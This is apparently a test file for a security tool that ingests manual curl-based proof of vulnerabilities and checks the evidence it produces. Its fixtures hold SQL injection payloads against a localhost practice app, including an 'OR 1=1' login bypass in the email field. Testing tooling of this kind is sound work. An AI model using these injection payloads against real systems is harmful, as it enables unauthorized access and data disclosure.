import { describe, expect, test } from "bun:test"
import { manualCommandEnvelope } from "../../src/security/manual-http-proof"

describe("manual http proof ingestion", () => {
  test("captures curl SQLi proof as canonical exchange evidence with verifications", () => {
    const envelope = manualCommandEnvelope({
      tool: "bash",
      command: "curl -s -i 'http://localhost:3000/rest/products/search?q=%27%20OR%201%3D1--'",
      output: [
        "HTTP/1.1 500 Internal Server Error",
        "Content-Type: text/html; charset=utf-8",
        "",
        "<html><title>Error: SQLITE_ERROR: incomplete input</title></html>",
      ].join("\n"),
      exitCode: 0,
    })

    expect(envelope).toBeDefined()
    expect(envelope?.artifacts[0]?.subtype).toBe("manual_http_exchange")
    expect(envelope?.artifacts[0]?.request.url).toContain("/rest/products/search")
    expect(envelope?.verifications.map((item) => item.key)).toContain("sqli-db-error")
    expect(envelope?.verifications.map((item) => item.key)).toContain("error-disclosure-stacktrace")
  })

  test("captures curl auth bypass proof from body-only responses", () => {
    const envelope = manualCommandEnvelope({
      tool: "security_shell",
      command:
        "curl -s -X POST 'http://localhost:3000/rest/user/login' -H 'Content-Type: application/json' --data-raw \"{\\\"email\\\":\\\"admin@juice-sh.op' OR 1=1--\\\",\\\"password\\\":\\\"test\\\"}\"",
      output: "{\"authentication\":{\"token\":\"jwt-token\"}}",
      exitCode: 0,
    })

    expect(envelope).toBeDefined()
    expect(envelope?.verifications.map((item) => item.key)).toContain("sqli-auth-bypass")
  })
})
